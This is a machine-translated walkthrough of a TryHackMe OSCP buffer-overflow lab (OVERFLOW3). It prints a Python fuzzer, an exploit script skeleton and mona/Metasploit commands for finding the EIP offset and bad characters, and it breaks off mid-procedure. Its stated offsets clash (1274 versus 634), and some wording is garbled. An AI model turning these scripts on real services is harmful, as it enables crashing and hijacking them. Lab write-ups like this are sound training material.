<html>
<head>
<title>TryHackMe: OSCP Buffer Overflow Prep (OVERFLOW 3)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMe: OSCP缓冲区溢出准备(溢出3)</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/tryhackme-oscp-buffer-overflow-prep-overflow-3-fdece5d96532?source=collection_archive---------0-----------------------#2021-04-14">https://infosecwriteups.com/tryhackme-oscp-buffer-overflow-prep-overflow-3-fdece5d96532?source=collection_archive---------0-----------------------#2021-04-14</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="c901" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">由Shamsher khan练习的基于堆栈的缓冲区溢出！对于OSCP </strong></p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kl"><img src="../Images/14efbe07744c4c1d04bb3fca96eebb11.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*05TKcgT5D1NdYuwpSNwysA.png"/></div></div></figure><p id="90ab" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">房间链接:</strong><a class="ae kx" href="https://www.tryhackme.com/room/bufferoverflowprep" rel="noopener ugc nofollow" target="_blank"><strong class="jp ir">https://www.tryhackme.com/room/bufferoverflowprep</strong></a><strong class="jp ir"><br/>注:此房免费</strong></p><p id="1c8c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在你完成这篇文章之前，确保你已经完成了</p><h2 id="5bf8" class="ky kz iq bd la lb lc dn ld le lf dp lg jy lh li lj kc lk ll lm kg ln lo lp lq bi translated"><a class="ae kx" href="https://shamsher-khan-404.medium.com/tryhackme-oscp-buffer-overflow-prep-overflow-1-19e000482f27" rel="noopener">缓冲区溢出准备(溢出-1) </a></h2><h2 id="17d6" class="ky kz iq bd la lb lc dn ld le lf dp lg jy lh li lj kc lk ll lm kg ln lo lp lq bi translated"><a class="ae kx" href="https://shamsher-khan-404.medium.com/tryhackme-oscp-buffer-overflow-prep-overflow-2-57c22b51a91f" rel="noopener">缓冲区溢出准备(溢出-2) </a></h2><p id="a650" class="pw-post-body-paragraph jn jo iq jp b jq lr js jt ju ls jw jx jy lt ka kb kc lu ke kf kg lv ki kj kk ij bi translated"><a class="ae kx" href="https://github.com/shamsherkhan852/Buffer-Overflow-Vulnerable-app" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir">下载OSCP.exe</strong></a></p><div class="lw lx gp gr ly lz"><a href="https://github.com/shamsherkhan852/Buffer-Overflow-Vulnerable-app" rel="noopener  ugc nofollow" target="_blank"><div class="ma ab fo"><div class="mb ab mc cl cj md"><h2 class="bd ir gy z fp me fr fs mf fu fw ip bi translated">shamsherkhan 852/缓冲区溢出漏洞app</h2><div class="mg l"><h3 class="bd b gy z fp me fr fs mf fu fw dk translated">SLMail安装程序。脑盘双星。dostackbufferoverflowgood二进制文件。vulnserver二进制文件。一个习俗…</h3></div><div class="mh l"><p class="bd b dl z fp me fr fs mf fu fw dk translated">github.com</p></div></div><div class="mi l"><div class="mj l mk ml mm mi mn kv lz"/></div></div></a></div><h1 id="190a" class="mo kz iq bd la mp mq mr ld ms mt mu lg mv mw mx lj my mz na lm nb nc nd lp ne bi translated">定义:</h1><ol class=""><li id="c3ca" class="nf ng iq jp b jq lr ju ls jy nh kc ni kg nj kk nk nl nm nn bi translated">EIP = &gt; 扩展指令指针(EIP)是一个寄存器，包含程序或命令的下一条指令的地址。</li><li id="648a" class="nf ng iq jp b jq no ju np jy nq kc nr kg ns kk nk nl nm nn bi translated"><strong class="jp ir"> ESP= &gt; </strong>扩展堆栈指针(ESP)是一个寄存器，它让你知道你在堆栈的什么位置，并允许你将数据推入和推出应用程序。</li><li id="19b4" class="nf ng iq jp b jq no ju np jy nq kc nr kg ns kk nk nl nm nn bi translated"><strong class="jp ir"> JMP = &gt; </strong>跳转(JMP)是一条修改执行流程的指令，其中您指定的操作数将包含要跳转到的地址。</li><li id="39f6" class="nf ng iq jp b jq no ju np jy nq kc nr kg ns kk nk nl nm nn bi translated"><strong class="jp ir"> \x41，\x42，\ x43 =&gt;</strong>A、B、c的十六进制值，对于这个练习来说，使用hex vs ascii并没有什么好处，这只是我个人的喜好。</li></ol><h1 id="64fc" class="mo kz iq bd la mp mq mr ld ms mt mu lg mv mw mx lj my mz na lm nb nc nd lp ne bi translated">溢出#2</h1><p id="4f83" class="pw-post-body-paragraph jn jo iq jp b jq lr js jt ju ls jw jx jy lt ka kb kc lu ke kf kg lv ki kj kk ij bi translated">好的，现在我们应该以管理员身份运行我们的免疫调试器并打开oscp.exe。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi nt"><img src="../Images/09f40619d0829e73556f8113da81b36e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1306/format:webp/0*z9wWhX4RPEfMxsM6.png"/></div></figure><p id="ed9c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">应用程序将以“暂停”状态加载到调试器中。在抗干扰调试器中点击上栏<strong class="jp ir">或F9 </strong>上的红色播放按钮。</p><p id="da4c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">通过检查免疫力调试器右下角的状态，确保exe正在运行。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi nu"><img src="../Images/db3d638200441f1c106386dbb4d2fa5f.png" data-original-src="https://miro.medium.com/v2/resize:fit:620/format:webp/0*11IpQxRpySq-SAOP.png"/></div></div></figure><p id="8290" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">要进行检查，我们可以使用端口1337 NC到目标机器。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi nv"><img src="../Images/1d8fac6bc6bd686c5f01913dbe269c2c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1052/format:webp/1*IkRBW6MguN2g_LcgOSCbKw.png"/></div></figure><p id="9ae0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这里我选择<strong class="jp ir">溢出3 </strong>参数</p><p id="a8b4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在mona中设置工作文件夹。</p><div class="lw lx gp gr ly lz"><a href="https://github.com/corelan/mona" rel="noopener  ugc nofollow" target="_blank"><div class="ma ab fo"><div class="mb ab mc cl cj md"><h2 class="bd ir gy z fp me fr fs mf fu fw ip bi translated">科勒兰/莫娜</h2><div class="mg l"><h3 class="bd b gy z fp me fr fs mf fu fw dk translated">是一个python脚本，可以用来自动化和加速特定的搜索…</h3></div><div class="mh l"><p class="bd b dl z fp me fr fs mf fu fw dk translated">github.com</p></div></div><div class="mi l"><div class="nw l mk ml mm mi mn kv lz"/></div></div></a></div><p id="3be0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">将mona.py和paset下载到C:\ Program Files(x86)\ Immunity Inc \ Immunity Debugger \ py commands</p><pre class="km kn ko kp gt nx ny nz oa aw ob bi"><span id="e67c" class="ky kz iq ny b gy oc od l oe of">!mona config -set workingfolder c:\mona\%p</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi og"><img src="../Images/7354cf96babef071a5faad7a64d5f635.png" data-original-src="https://miro.medium.com/v2/resize:fit:838/format:webp/0*ROy2dpGHjRhHEGBQ.png"/></div></figure><p id="46c8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们试着运行fuzzer.py(从房间获取)看看结果。只需检查脚本中的IP是否正确，并确保在运行脚本之前再次运行免疫调试器中的oscp.exe。</p><p id="826a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">注意:-在fuzzer.py和exploit.py中把OVERFLOW2命令改为overflow 3</strong></p><h1 id="974d" class="mo kz iq bd la mp mq mr ld ms mt mu lg mv mw mx lj my mz na lm nb nc nd lp ne bi translated">Fuzzer.py</h1><pre class="km kn ko kp gt nx ny nz oa aw ob bi"><span id="d120" class="ky kz iq ny b gy oc od l oe of">import socket, time, sysip = "192.168.43.57";<br/>port = 1337<br/>timeout = 5buffer = []<br/>counter = 100<br/>while len(buffer) &lt; 30:<br/>    buffer.append("A" * counter)<br/>    counter += 100for string in buffer:<br/>    try:<br/>        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br/>        s.settimeout(timeout)<br/>        connect = s.connect((ip, port))<br/>        s.recv(1024)<br/>        print("Fuzzing with %s bytes" % len(string))<br/>        s.send("OVERFLOW3 " + string + "\r\n")<br/>        s.recv(1024)<br/>        s.close()<br/>    except:<br/>        print("Could not connect to " + ip + ":" + str(port))<br/>        sys.exit(0)<br/>    time.sleep(1)</span></pre><p id="6aa3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">还复制了<strong class="jp ir"> exploit.py </strong>代码</p><pre class="km kn ko kp gt nx ny nz oa aw ob bi"><span id="8db5" class="ky kz iq ny b gy oc od l oe of">import socket</span><span id="b20a" class="ky kz iq ny b gy oh od l oe of">ip = "192.168.43.57"<br/>port = 1337</span><span id="bafc" class="ky kz iq ny b gy oh od l oe of">prefix = "OVERFLOW3 "<br/>offset = 0<br/>overflow = "A" * offset<br/>retn = ""<br/>padding = ""<br/>payload = ""<br/>postfix = ""</span><span id="11d5" class="ky kz iq ny b gy oh od l oe of">buffer = prefix + overflow + retn + padding + payload + postfix</span><span id="2765" class="ky kz iq ny b gy oh od l oe of">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><span id="6ebf" class="ky kz iq ny b gy oh od l oe of">try:<br/>  s.connect((ip, port))<br/>  print("Sending evil buffer...")<br/>  s.send(bytes(buffer + "\r\n", "latin-1"))<br/>  print("Done!")<br/>except:<br/>  print("Could not connect.")</span></pre><p id="f229" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">点击红色的播放按钮，并开始对目标IP fuzzer . py</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi oi"><img src="../Images/46cd7a86c95dd6590ed9e020bf08ccee.png" data-original-src="https://miro.medium.com/v2/resize:fit:786/format:webp/1*5QgbvcywqQqQD8-2L3ewjA.png"/></div></figure><p id="d542" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果您看到它在1300字节处停止，这意味着偏移量将在1200到1300字节的范围内。让我们创建一个大于偏移量100字节的模式，也就是1400字节。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi oj"><img src="../Images/be2aa7517ccff7b1d51b00eebbb4de97.png" data-original-src="https://miro.medium.com/v2/resize:fit:1352/format:webp/1*7rwNOQwuBW_litKX3ID6oQ.png"/></div></figure><p id="235e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">上图中你可以看到EIP已经被41414141 (AAAA)覆盖。所以我们需要找到程序崩溃的确切地址</p><p id="1215" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在根据使服务器崩溃的字节长度生成一个模式。</p><pre class="km kn ko kp gt nx ny nz oa aw ob bi"><span id="60a2" class="ky kz iq ny b gy oc od l oe of">msf-pattern_create -l 1400</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ok"><img src="../Images/e84c94fc5f98a3e7a67694739c38bc9a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*QknrpgvGmSizpTLITGe-aA.png"/></div></div></figure><p id="9589" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以复制有效载荷，放入exploit.py中的有效载荷变量，尝试运行。该脚本应该会再次使oscp.exe服务器崩溃。</p><p id="846c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">【CTRL+F2 =重新加载OSCP.exe</p><p id="f5ac" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> F9 =运行服务器</strong></p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ol"><img src="../Images/e3a315a30dcdba3ce301e1bbfe73dfd4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*IoL78PrX95LTG0RRom5MVw.png"/></div></div></figure><p id="48ae" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">确保oscp.exe正在免疫调试器中运行。对目标执行exploit.py。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi om"><img src="../Images/b50925efda82d4834d63aeb513585f05.png" data-original-src="https://miro.medium.com/v2/resize:fit:834/format:webp/1*6vsfTwuKQuBrGPqObJjLsA.png"/></div></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi on"><img src="../Images/d721f49d7b1eef89d69d058cf83dd2e7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1344/format:webp/1*YZ5V4k2xP0vf97xpO0xcEQ.png"/></div></figure><p id="1ba8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在上图中，我们有<strong class="jp ir"> EIP=35714234 </strong></p><p id="2b4d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">EIP被我们生成的偏移量覆盖。</p><h1 id="6f90" class="mo kz iq bd la mp mq mr ld ms mt mu lg mv mw mx lj my mz na lm nb nc nd lp ne bi translated">查找偏移值</h1><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi oo"><img src="../Images/8e9c5e32b41e3277cb51a1277bf0b8fc.png" data-original-src="https://miro.medium.com/v2/resize:fit:858/format:webp/1*0QAW5GQpF6T02oRfR7lWmQ.png"/></div></figure><p id="bdf4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">偏移值是1274</p><p id="f5e5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">使用mona模块查找偏移值的另一种方法</strong></p><p id="0a30" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">尝试在免疫模式下运行以下mona命令:</p><pre class="km kn ko kp gt nx ny nz oa aw ob bi"><span id="4df4" class="ky kz iq ny b gy oc od l oe of">!mona findmsp -distance 1600</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi op"><img src="../Images/11f62a6ffc5889ca855c1d3d72848246.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8VB6tnhBYa463IcNJXkeSQ.png"/></div></div></figure><p id="9a11" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以寻找表示EIP包含正常模式的行:0x76413176(偏移量634)。我们在offset变量中找到的偏移量，并将retn变量设置为BBBB。</p><p id="8390" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">更新偏移量和retn变量</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ol"><img src="../Images/38e5e4981505cbea26b3063138bcf682.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5UFX_30tyTwtxZLwL9_Yxw.png"/></div></div></figure><p id="6c99" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">重新启动。exe，并按Ctrl+F12和F9运行。执行exploit.py。如果偏移量正确，我们应该看到“42424242”</p><p id="b1b0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Let’s run it again.</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi om"><img src="../Images/b50925efda82d4834d63aeb513585f05.png" data-original-src="https://miro.medium.com/v2/resize:fit:834/format:webp/1*6vsfTwuKQuBrGPqObJjLsA.png"/></div></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi on"><img src="../Images/cfce1e1ba857aa45ec4471acd63b8833.png" data-original-src="https://miro.medium.com/v2/resize:fit:1344/format:webp/1*pZMt0Ao7MLm0jcC88EAxvg.png"/></div></figure><p id="d3d8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">As we can see the <strong class="jp ir">EIP</strong>寄存器被BBBB或42424242覆盖。到目前为止，一切都很顺利。</p><p id="355d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">记下ESP地址，因为我们将在后续步骤中使用该位置的值</p><h1 id="045e" class="mo kz iq bd la mp mq mr ld ms mt mu lg mv mw mx lj my mz na lm nb nc nd lp ne bi translated">查找Badchars</h1><p id="8461" class="pw-post-body-paragraph jn jo iq jp b jq lr js jt ju ls jw jx jy lt ka kb kc lu ke kf kg lv ki kj kk ij bi translated">现在我们需要找到bad char——为此我们创建bad char，使用MONA在机器内部设置，另一个只需通过谷歌搜索或使用python脚本。默认情况下\x00被认为是一个坏字符，所以它肯定会被忽略。这有助于我们识别对我们的程序真正有害的字符！</p><p id="8e0f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用mona生成bytearray，默认情况下排除空字节(\x00)。</p><p id="44dd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用这个mona命令。</p><pre class="km kn ko kp gt nx ny nz oa aw ob bi"><span id="d400" class="ky kz iq ny b gy oc od l oe of">!mona bytearray -b "\x00"</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kl"><img src="../Images/e5e95efbd37f6c896b9f717ec892e3c9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*omTmOKJZyIp8ict4.png"/></div></div></figure><p id="28ec" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们需要从\x01到\xff生成一个与bytearray相同的坏字符字符串。使用python脚本</p><h1 id="afe1" class="mo kz iq bd la mp mq mr ld ms mt mu lg mv mw mx lj my mz na lm nb nc nd lp ne bi translated">bytegen.py</h1><pre class="km kn ko kp gt nx ny nz oa aw ob bi"><span id="6f36" class="ky kz iq ny b gy oc od l oe of">for x in range(1, 256):<br/>  print("\\x" + "{:02x}".format(x), end='')<br/>print()</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi oq"><img src="../Images/05fe2b66d1dfb7c9625b9e787dcdcd0d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*c6i6vqeHY9sYnWh8.png"/></div></div></figure><p id="d62a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这个生成的字符串已经删除了\x00，所以我们需要从。和莫娜在一起。</p><p id="3536" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">将新生成的字符串复制到exploit.py中的有效负载变量中</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi or"><img src="../Images/b662000f6fafec575cf6c8e793e88fb6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OCm3_2zAWIgFm6d9BsNbAA.png"/></div></div></figure><p id="05b1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">运行脚本并记下ESP寄存器指向的地址</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi os"><img src="../Images/8045dc60c97d375ce89de6d3d2ef6208.png" data-original-src="https://miro.medium.com/v2/resize:fit:812/format:webp/0*7r-q8MggaKqVI4yH.png"/></div></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi ot"><img src="../Images/a07dfff1bf0fd791a558a783a338c6cf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1340/format:webp/1*R4ox-Yji6Isw9uXogVDNEw.png"/></div></figure><p id="8459" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">右键单击ESP值，然后转储</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ou"><img src="../Images/1fbccd9fb454b8ee8bab2acbe7206875.png" data-original-src="https://miro.medium.com/v2/resize:fit:766/format:webp/1*rGSjCzTJHc2z6C35bEHCYg.png"/></div></div></figure><p id="9a25" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在上面的图像中，序列在10或13之间被改变，这意味着在有效载荷中有一些坏字符，让我们找出坏字符</p><p id="593c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在下面的mona命令中使用它</p><p id="e06c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">注意:- </strong>也许您的ESP地址不同</p><pre class="km kn ko kp gt nx ny nz oa aw ob bi"><span id="1128" class="ky kz iq ny b gy oc od l oe of">!mona compare -f C:\mona\oscp\bytearray.bin -a 00D0FA28</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ov"><img src="../Images/9e8f37339ab25799c86f30088e0d195d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*20AM9e_yLu-0tG8jx8ACVA.png"/></div></div></figure><p id="7589" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">可能的错误字符</p><p id="f299" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我们找到了一个可能的坏字符列表<code class="fe ow ox oy ny b"><strong class="jp ir">11 12 40 41 5f 60 b8 b9 ee ef</strong></code></p><p id="553f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">并非所有这些都是不好的字符！有时坏字符也会导致下一个字节损坏，甚至影响字符串的其余部分。</p><p id="d2da" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">此时，我开始一次删除一个不良字符。我通过重复以下步骤，一次删除一个坏字符:</p><ul class=""><li id="4bff" class="nf ng iq jp b jq jr ju jv jy oz kc pa kg pb kk pc nl nm nn bi translated">从字节数组中删除字符</li><li id="9e97" class="nf ng iq jp b jq no ju np jy nq kc nr kg ns kk pc nl nm nn bi translated">从漏洞有效载荷中移除字符</li><li id="45ec" class="nf ng iq jp b jq no ju np jy nq kc nr kg ns kk pc nl nm nn bi translated">启动exe</li><li id="b8e5" class="nf ng iq jp b jq no ju np jy nq kc nr kg ns kk pc nl nm nn bi translated">使用mona进行比较</li></ul><p id="0076" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">开始豁免oscp.exe，</p><p id="9008" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我创建了一个新的bytearray，并从有效负载中删除了\x11</p><pre class="km kn ko kp gt nx ny nz oa aw ob bi"><span id="4d54" class="ky kz iq ny b gy oc od l oe of">!mona bytearray -b "\x00\x11"</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi pd"><img src="../Images/3de2aef1a8f4ea1e4d3b87330e542d0a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1336/format:webp/1*X0UxulLtNxIpPG6dTBgUgw.png"/></div></figure><p id="4c14" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">运行服务器</p><p id="8db1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">编辑exploit.py从有效负载变量中删除\x11并运行exploit.py</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi os"><img src="../Images/7bb165178f8a596e83f1be56bfb77552.png" data-original-src="https://miro.medium.com/v2/resize:fit:812/format:webp/0*NI-UoSqyBipD1x8x.png"/></div></figure><p id="3c1e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">检查ESP指针值</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi pd"><img src="../Images/13f358ae0af546dce0410b6cd8a26aa9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1336/format:webp/1*t-MVzvubVQR-NZ_ZqcHDkA.png"/></div></figure><pre class="km kn ko kp gt nx ny nz oa aw ob bi"><span id="00c6" class="ky kz iq ny b gy oc od l oe of">!mona compare -f C:\mona\oscp\bytearray.bin -a 00D5FA28(ESP)</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi pe"><img src="../Images/16a987368a35c3bb19acb9eddcc93e26.png" data-original-src="https://miro.medium.com/v2/resize:fit:1260/format:webp/1*Jf9TF6W8uo4qby9uXla7JA.png"/></div></div></figure><p id="472e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">根据免疫调试器的提示，现在可能的错误字符是x40 \ x41 \ x5f \ X60 \ xb8 \ xb9 \ xee \ xef。这意味着一个BADCHAR把它的相邻字节也变成了BADCHAR，缺省情况下BAD char是不需要的</p><p id="f116" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">开始豁免oscp.exe</p><p id="8cf9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我创建了一个新的bytearray，并从有效负载中删除了\x40</p><pre class="km kn ko kp gt nx ny nz oa aw ob bi"><span id="d5dd" class="ky kz iq ny b gy oc od l oe of">!mona bytearray -b "\x00\x11\x40"</span></pre><p id="c65f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">运行服务器</p><p id="422c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">编辑exploit.py从有效负载变量中删除\x40并运行exploit.py</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi os"><img src="../Images/da00e7e4730eaead9fe41edf6c016112.png" data-original-src="https://miro.medium.com/v2/resize:fit:812/format:webp/0*FgXjPdcN2er1itBe.png"/></div></figure><p id="d505" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">检查ESP指针值</p><figure class="km kn ko 